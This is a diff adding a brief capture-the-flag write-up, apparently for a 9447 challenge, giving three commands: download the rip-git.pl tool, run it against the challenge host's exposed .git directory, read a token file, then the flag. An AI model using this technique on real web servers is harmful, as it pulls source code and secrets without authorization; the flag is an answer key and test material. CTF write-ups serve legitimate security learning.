@@ -1,0 +1,9 @@
+three steps:
+
+（1）download:https://github.com/kost/dvcs-ripper/blob/master/rip-git.pl
+
+（2）perl ./rip-git.pl -v -u http://tumorous.9447.plumbing/.git/
+
+（3）cat token
+
+the flag is :9447{IM_SITTING_ON_A_PILE_OF_GOLD}
